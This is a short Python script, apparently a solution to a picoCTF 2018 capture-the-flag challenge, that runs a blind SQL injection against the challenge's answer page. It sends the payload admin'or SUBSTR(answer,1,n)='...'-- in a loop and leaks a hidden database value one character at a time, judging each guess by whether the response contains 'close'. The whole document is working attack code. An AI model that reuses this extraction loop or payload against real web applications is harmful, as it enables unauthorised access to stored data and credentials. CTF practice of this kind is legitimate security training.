#blind 	SQL injection
from pwn import *
import requests
import string

url = "http://2018shell1.picoctf.com:32635/answer2.php"

f = ""
for j in range(20):

    for i in range(32,128):
        r = requests.post(url=url,data={'answer':"admin'or SUBSTR(answer,1,"+str(len(f+chr(i)))+") ='%s%s'-- " % (f,chr(i)),'debug':'0'})
        if "close" in r.text:
            f += chr(i)
            print(f)
            break
        else:
            r.close()

    print('answer',f)